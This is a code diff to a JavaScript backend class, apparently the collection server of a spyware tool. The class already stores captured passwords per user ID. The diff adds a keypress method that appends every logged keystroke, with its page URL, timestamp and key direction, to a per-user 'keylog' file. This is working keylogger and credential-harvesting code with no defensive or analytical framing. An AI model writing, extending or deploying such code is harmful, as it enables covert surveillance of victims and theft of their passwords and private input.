@@ -7,14 +7,16 @@ const writeJSON = (path, data) => {
         }
     });
 };
+const appendTXT = (path, text) => fs.appendFileSync(path, text);
 
 const readJSON = (path) => JSON.parse(fs.readFileSync(path, "utf8"));
 const fileExists = (path) => fs.existsSync(path);
 
 export default class SaveData {
     constructor() {
-        this.dataFolder = "backend/data/";
-        this.makePath = (uid) => `${this.dataFolder}${uid}.json`;
+        this.dataFolder = "backend/data";
+        this.makePath = (uid) => `${this.dataFolder}/${uid}.json`;
+        this.makeKeylogPath = (uid) => `${this.dataFolder}/keylog_${uid}.txt`;
         this.data = {};
     }
 
@@ -71,6 +73,15 @@ export default class SaveData {
                 this.data[uid].passwords.push(data);
             }
             this.updateUser(uid);
+        }
+    }
+
+    keypress(uid, time, url, direction, key) {
+        if (uid) {
+            appendTXT(
+                this.makeKeylogPath(uid),
+                `${url} ${time} ${direction} '${key}'\n`
+            );
         }
     }
 }
